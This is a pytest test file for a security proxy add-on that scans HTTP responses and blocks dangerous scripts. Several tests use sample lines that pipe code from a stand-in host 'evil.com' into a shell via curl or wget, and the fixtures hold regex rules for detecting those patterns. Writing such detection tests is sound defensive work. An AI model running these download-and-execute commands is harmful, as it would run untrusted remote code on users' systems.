import json
from unittest.mock import patch

import pytest

from proxy.aegis_addon import AegisAddon
from tests.conftest import make_flow


def _make_response_flow(**kwargs):
    kwargs.setdefault("status_code", 200)
    kwargs.setdefault("content_type", "text/html")
    kwargs.setdefault("body", b"<html></html>")
    flow = make_flow(**kwargs)
    flow.metadata["aegis_request_id"] = "req_test123"
    return flow


@pytest.fixture
def addon(tmp_path):
    whitelist = tmp_path / "domain_whitelist.txt"
    whitelist.write_text("github.com\n")

    blocklist = tmp_path / "c2_blocklist.txt"
    blocklist.write_text("")

    rules = tmp_path / "rules.yml"
    rules.write_text(
        "dangerous_patterns:\n"
        "  - name: curl_pipe_bash\n"
        "    pattern: 'curl\\s+.*\\|\\s*(ba)?sh'\n"
        "    severity: critical\n"
        "    description: Piping curl to shell\n"
        "  - name: wget_pipe_sh\n"
        "    pattern: 'wget\\s+.*\\|\\s*(ba)?sh'\n"
        "    severity: critical\n"
        "    description: Piping wget to shell\n"
    )

    with patch("proxy.aegis_addon.RULES_PATH", tmp_path):
        return AegisAddon()


class TestResponseHookPatterns:
    def test_safe_html_passes(self, addon):
        flow = _make_response_flow(content_type="text/html", body=b"<html>hello</html>")
        addon.response(flow)
        assert flow.response.status_code == 200

    def test_curl_pipe_bash_blocked(self, addon):
        flow = _make_response_flow(
            content_type="text/x-shellscript",
            body=b"#!/bin/bash\ncurl https://evil.com/install.sh | bash\n",
        )
        addon.response(flow)
        assert flow.response.status_code == 403
        body = json.loads(flow.response.content)
        assert body["reason"] == "dangerous_script_pattern"

    def test_wget_pipe_sh_blocked(self, addon):
        flow = _make_response_flow(
            content_type="text/x-shellscript",
            body=b"wget https://evil.com/payload | sh\n",
        )
        addon.response(flow)
        assert flow.response.status_code == 403

    def test_safe_script_passes(self, addon):
        flow = _make_response_flow(
            content_type="text/x-shellscript",
            body=b"#!/bin/bash\necho hello\n",
        )
        addon.response(flow)
        assert flow.response.status_code == 200


class TestResponseHookJavaScript:
    def test_safe_js_passes(self, addon):
        flow = _make_response_flow(
            content_type="text/javascript",
            body=b"console.log('hello');",
        )
        addon.response(flow)
        assert flow.response.status_code == 200

    def test_dangerous_js_blocked(self, addon):
        flow = _make_response_flow(
            content_type="text/javascript",
            body=b"curl https://evil.com/payload | bash",
        )
        addon.response(flow)
        assert flow.response.status_code == 403

    def test_application_javascript_scanned(self, addon):
        flow = _make_response_flow(
            content_type="application/javascript",
            body=b"curl https://evil.com/payload | bash",
        )
        addon.response(flow)
        assert flow.response.status_code == 403

    def test_js_not_sent_to_scanner(self, addon):
        flow = _make_response_flow(
            content_type="text/javascript",
            body=b"console.log('hello');",
        )
        with patch("proxy.aegis_addon.scan_payload") as mock_scan:
            addon.response(flow)
        mock_scan.assert_not_called()


class TestResponseHookScanner:
    def test_binary_allow(self, addon):
        flow = _make_response_flow(
            content_type="application/octet-stream",
            body=b"\x00" * 100,
        )
        with patch("proxy.aegis_addon.scan_payload", return_value="allow"):
            addon.response(flow)
        assert flow.response.status_code == 200
        assert "X-Aegis-Warning" not in flow.response.headers

    def test_binary_block(self, addon):
        flow = _make_response_flow(
            content_type="application/octet-stream",
            body=b"\x00" * 100,
        )
        with patch("proxy.aegis_addon.scan_payload", return_value="block"):
            addon.response(flow)
        assert flow.response.status_code == 403
        body = json.loads(flow.response.content)
        assert body["reason"] == "scanner_verdict_block"

    def test_binary_warn_adds_header(self, addon):
        flow = _make_response_flow(
            content_type="application/octet-stream",
            body=b"\x00" * 100,
        )
        with patch("proxy.aegis_addon.scan_payload", return_value="warn"):
            addon.response(flow)
        assert flow.response.status_code == 200
        assert flow.response.headers["X-Aegis-Warning"] == "medium-risk vulnerability detected"
        assert flow.response.headers["X-Aegis-Request-Id"] == "req_test123"

    def test_scanner_timeout_blocks(self, addon):
        """Fail-closed: scanner timeout should result in block."""
        flow = _make_response_flow(
            content_type="application/octet-stream",
            body=b"\x00" * 100,
        )
        with patch("proxy.aegis_addon.scan_payload", return_value="block"):
            addon.response(flow)
        assert flow.response.status_code == 403


class TestResponseHookSkip:
    def test_already_blocked_skipped(self, addon):
        flow = _make_response_flow(status_code=403)
        addon.response(flow)
        # Should not modify the existing 403

    def test_pass_through_content_not_scanned(self, addon):
        flow = _make_response_flow(
            content_type="application/json",
            body=b'{"key": "value"}',
        )
        with patch("proxy.aegis_addon.scan_payload") as mock_scan:
            addon.response(flow)
        mock_scan.assert_not_called()
